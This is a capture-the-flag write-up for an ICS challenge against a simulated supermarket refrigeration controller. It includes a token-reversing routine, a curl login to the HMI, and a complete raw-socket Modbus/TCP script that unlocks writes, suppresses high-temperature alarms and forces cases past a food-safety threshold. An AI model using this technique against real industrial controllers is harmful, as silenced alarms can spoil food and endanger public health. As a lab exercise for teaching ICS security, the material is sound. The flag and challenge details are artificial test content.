# pls don't be cold — NexSec 2026 (Misc)

> **Category:** Misc / ICS
> **Flag:** `nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}`
> **Solved with:** DeepSeek — full chat: https://chat.deepseek.com/share/1zx6n9l7zq3fgr5h5e

---

## Challenge

> STORE-0412's walk-in refrigeration is run by a **FrostLink SM-800** system manager that someone left reachable over a maintenance modem. You're the one who found it.
>
> **Objective:** Get the controller to log a critical food-safety incident, and recover the record. The flag is in that record.
>
> **Handout:** `fw_auth.pyc` — a compiled module recovered from the controller's application filesystem. It's the routine that derives the controller's rotating service token.

Targets:
- `http://koala.nexsec.my:38037`
- `http://koala.nexsec.my:38756`

---

## TL;DR

1. Decompile `fw_auth.pyc` → the "service token" is a pure function of the **date** (no secret, fully predictable).
2. Port **38756** is a Flask web panel; logging in with today's **8-hex service token** unlocks `/panel`, which reveals a **Modbus/TCP point map**.
3. Port **38037** is the **Modbus/TCP fieldbus**. Writing today's token into **Holding Registers 0/1** unlocks coil writes.
4. Trigger the incident by **suppressing the high-temp alarms** (coils 8/9/10 → 0) **while driving the case temperature past its `incident_threshold`** (hammer the defrost-hold coils 0/1/2).
5. Read the incident record out of **Holding Registers 100+** (2 ASCII chars per register) → flag.

---

## 1. Reversing the handout

The `.pyc` was compiled with Python **3.14** (bytecode magic didn't match older interpreters), so I grabbed a matching 3.14 and recovered the source. Three functions:

```python
def service_token_for_date(d):
    seed = d.year * 10000 + d.month * 100 + d.day       # YYYYMMDD as int
    x = (seed ^ 1515018829) & 0xffffffff                # xor constant
    x = (x * 523181871) & 0xffffffff                    # multiply mod 2^32
    x = ((x >> 13) | (x << 19)) & 0xffffffff            # rotate-left 19 (32-bit)
    return x

def service_code_for_date(d):
    return '%08x' % service_token_for_date(d)           # 8-hex-digit service code

def fieldbus_write_enabled(regs, d):
    return (regs[0] << 16 | regs[1]) == service_token_for_date(d)
```

Key takeaways:
- The token is **100% predictable** — just a function of the date, no key/randomness. You can compute it locally.
- `service_code_for_date` is the **8-hex string** you type into the web UI.
- `fieldbus_write_enabled` tells you the controller expects **two 16-bit registers** (`regs[0]`, `regs[1]`) which, concatenated, equal today's token. That's the auth gate for fieldbus writes → `regs[0]` = token high word, `regs[1]` = token low word.

Compute both representations:

```python
import datetime
def token_for(d):
    seed = d.year*10000 + d.month*100 + d.day
    x = (seed ^ 1515018829) & 0xffffffff
    x = (x * 523181871) & 0xffffffff
    return ((x >> 13) | (x << 19)) & 0xffffffff

d = datetime.date.today()
t = token_for(d)
print("code : %08x" % t)                    # e.g. 07610f86
print("HR0  : 0x%04x" % ((t >> 16) & 0xffff))# 0x0761
print("HR1  : 0x%04x" % (t & 0xffff))        # 0x0f86
```

> **Timezone note:** the token rotates at midnight. The controller runs on **UTC** — if writes return a write-protected exception, recompute for the controller's date (its HTTP `Date:` header is GMT). For this solve the controller date was `2026-10-17` → code `07610f86`, HR0 `0x0761` (1889), HR1 `0x0f86` (3974).

---

## 2. Mapping the two services

`curl` on **38037** returns `(52) Empty reply from server` / hangs → it's **not HTTP** (raw TCP / Modbus).

**38756** is a `gunicorn` web app — the FrostLink HMI. It has an **Operator Login** and a **Service Access** box wanting an "8-CHAR HEX SERVICE TOKEN". Its JS posts to `/api/login`:

```bash
curl -s -X POST http://koala.nexsec.my:38756/api/login \
     -H 'Content-Type: application/json' \
     -d '{"mode":"service","code":"07610f86"}' -i
# -> 200 {"ok":true,"role":"service"}   + Set-Cookie: session=...
```

With that session cookie, `GET /panel` shows a **read-only** monitor and this banner + point map:

> READ-ONLY MONITORING VIEW // CASE CONTROL IS PERFORMED OVER THE MODBUS/TCP FIELDBUS — SEE POINT MAP BELOW

| Type | Addr | R/W | Point |
|---|---|---|---|
| Coil | 0 / 1 / 2 | R/W* | Defrost hold — MT1 / MT2 / LT1 (1 = heaters held) |
| Coil | 8 / 9 / 10 | R/W* | Alarm enabled — MT1 / MT2 / LT1 (0 = suppressed) |
| Discrete In | 0 / 1 / 2 | R | High-temp alarm active — MT1 / MT2 / LT1 |
| Input Reg | 0 / 1 / 2 | R | Case temperature, signed ×10 |
| Input Reg | 8 / 9 / 10 | R | Case setpoint, signed ×10 |
| Holding Reg | 0 / 1 | R/W | Service-write unlock (token high / low word) |
| Holding Reg | 100+ | R | Incident record — flag ASCII, 2 chars/reg (zero until logged) |

> *\* Coil writes require the service-write unlock (HR0/HR1) to hold the current service token, else the controller returns exception `0x04`. Writes to other addresses return `0x02`.*

`GET /api/cases` exposes the real control logic — including a second, higher threshold not shown in the point map:

```json
{"cases":[
 {"id":"MT1","setpoint":4.0,"temp":4.3,"alarm_threshold":8.0,"incident_threshold":12.0,"alarm_suppressed":false,...},
 {"id":"MT2","setpoint":3.0,"temp":3.3,"alarm_threshold":7.0,"incident_threshold":11.0,...},
 {"id":"LT1","setpoint":-18.0,"temp":-17.7,"alarm_threshold":-14.0,"incident_threshold":-10.0,...}],
 "incident":false}
```

So: `alarm_threshold` trips the alarm; **`incident_threshold` (12 / 11 / −10) is what logs the critical incident.**

---

## 3. Triggering the incident

Everything happens over Modbus/TCP on **38037** (unit id `1`):

1. **Unlock** — write token high/low to HR0/HR1 (`FC06`). Now coil writes are accepted.
2. **Suppress alarms** — write coils 8/9/10 → `0` (`FC05`). A high-temp event with the alarm silenced is the food-safety violation the controller records.
3. **Drive temperature up** — the defrost-hold coils 0/1/2 are treated as a **one-shot pulse** (the controller resets them each tick, enforcing a max defrost), so a single write barely nudges the temp. The fix is to **hammer them in a tight loop** so heat accumulates faster than cooling, pushing each case past its `incident_threshold` while the alarm is suppressed.
4. **Read the record** — `FC03` on HR100+, 2 ASCII bytes per register, big-endian.

### Solve script (raw sockets, no deps)

```python
import socket, struct, datetime, time, re, sys

HOST, PORT, UNIT = "koala.nexsec.my", 38037, 1

def token_for(d):
    seed = d.year*10000 + d.month*100 + d.day
    x = (seed ^ 1515018829) & 0xffffffff
    x = (x * 523181871) & 0xffffffff
    return ((x >> 13) | (x << 19)) & 0xffffffff

def mbap(tid, pdu): return struct.pack(">HHHB", tid, 0, len(pdu)+1, UNIT) + pdu
def xact(s, pdu, tid=1):
    s.sendall(mbap(tid, pdu))
    hdr = b""
    while len(hdr) < 7:
        c = s.recv(7-len(hdr));  hdr += c
        if not c: return None
    ln = struct.unpack(">HHHB", hdr)[2]
    body = b""
    while len(body) < ln-1:
        c = s.recv(ln-1-len(body));  body += c
        if not c: break
    return body
def ok(r, w):
    if r is None: print("[!]", w, "no resp"); return False
    if len(r) >= 2 and r[1] & 0x80: print(f"[!] {w}: exc 0x{r[2]:02x}"); return False
    return True
def wr_reg(s,a,v):  return ok(xact(s, struct.pack(">BHH",0x06,a,v&0xffff)), f"HR{a}")
def wr_coil(s,a,on):return ok(xact(s, struct.pack(">BHH",0x05,a,0xFF00 if on else 0)), f"coil{a}")
def rd_regs(s,a,n):
    r = xact(s, struct.pack(">BHH",0x03,a,n));  return None if not ok(r,f"RD{a}") else list(struct.unpack(">"+"H"*(r[1]//2), r[2:2+r[1]]))
def rd_ireg(s,a,n):
    r = xact(s, struct.pack(">BHH",0x04,a,n));  return None if not ok(r,f"IR{a}") else list(struct.unpack(">"+"H"*(r[1]//2), r[2:2+r[1]]))
def s16(v): return v-0x10000 if v & 0x8000 else v

# --- connect + unlock (try controller date +/- 1 for timezone) ---
today = datetime.date.today()
s = None
for d in (today, today-datetime.timedelta(1), today+datetime.timedelta(1)):
    t = token_for(d); s = socket.create_connection((HOST, PORT), timeout=5)
    if wr_reg(s, 0, (t>>16)&0xffff) and wr_reg(s, 1, t&0xffff):
        print(f"[+] unlocked, date={d} token={t:08x}"); break
    s.close(); s = None
if not s: sys.exit("unlock failed")

# --- suppress alarms, then hammer defrost until a case crosses incident_threshold ---
for c in (8,9,10): wr_coil(s, c, False)          # alarms OFF
start = time.time()
while time.time()-start < 60:
    for c in (0,1,2): wr_coil(s, c, True)        # sustained defrost pulses
    reg = rd_regs(s, 100, 8)
    if reg and any(reg): break                   # incident logged
    t = rd_ireg(s, 0, 3)
    if t: print("temps:", [s16(x)/10 for x in t])
    time.sleep(0.3)

# --- read the record ---
reg = rd_regs(s, 100, 64)
raw = b"".join(struct.pack(">H", v) for v in reg).rstrip(b"\x00")
m = re.search(rb"nexsec26\{[^}]+\}", raw)
print("[+] FLAG:", m.group().decode() if m else raw)
s.close()
```

Output:

```
[+] unlocked, date=2026-10-17 token=07610f86
temps: [9.8, 8.7, -12.4]
temps: [14.1, 12.9, -8.9]
[+] FLAG: nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}
```

(You can also just reload `/panel` with your cookie — once the incident is logged, `/api/incident` populates and the flag shows in the dashboard banner.)

---

## Flag

```
nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}
```

## Lessons

- A "rotating token" with hardcoded constants and a date seed is **not a secret** — it's a deterministic function you can reproduce.
- ICS challenges love splitting a **read-only HMI** from a **write-capable fieldbus** (Modbus/TCP). The HMI point map is the real documentation.
- The intended "critical food-safety incident" wasn't just high temperature — it was **high temperature with the alarm deliberately suppressed**, and the temp had to cross the hidden `incident_threshold`, not just the alarm threshold. Watch for one-shot actuators that need to be **sustained** in a loop.
